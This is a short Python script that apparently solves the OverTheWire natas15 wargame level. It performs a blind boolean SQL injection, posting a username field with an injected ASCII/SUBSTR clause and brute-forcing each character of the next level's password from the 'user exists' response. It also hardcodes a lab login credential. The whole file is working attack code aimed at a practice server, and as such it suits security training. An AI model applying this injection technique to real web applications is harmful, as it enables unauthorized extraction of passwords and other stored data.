#! /usr/bin/python

'''
http://docs.python-requests.org/en/latest/
'''

import requests

from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
username = "natas15"
password = "m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV"

# Binary search would be much faster, but classic is simple and fast in this case
#post_data = {"username": "natas16\" AND ASCII(SUBSTR(password, 1, 1)) < 128 AND \"1\" = \"1"}

# guess every one of the 32 letters of the password
next_passw = ['x' for i in range(0,32)]

for i in range(1, 33):
    for j in range (1,128):
        post_data = {"username": "natas16\" AND ASCII(SUBSTR(password, " + str(i) + ", 1)) = " + str(j) + " AND \"1\" = \"1"}
        resp = requests.post(url, data = post_data, auth = HTTPBasicAuth(username, password))
        #print "Ret code: ", resp.status_code, resp.reason
        #print "Headers: ", resp.headers

        if "user exists" in resp.text:
            print "Guessed p[%d] = %s" % (i-1, chr(j))
            next_passw[i-1] = chr(j)
            #Skip to the next i loop
            break
            
print "natas16 password: ", "".join(next_passw)
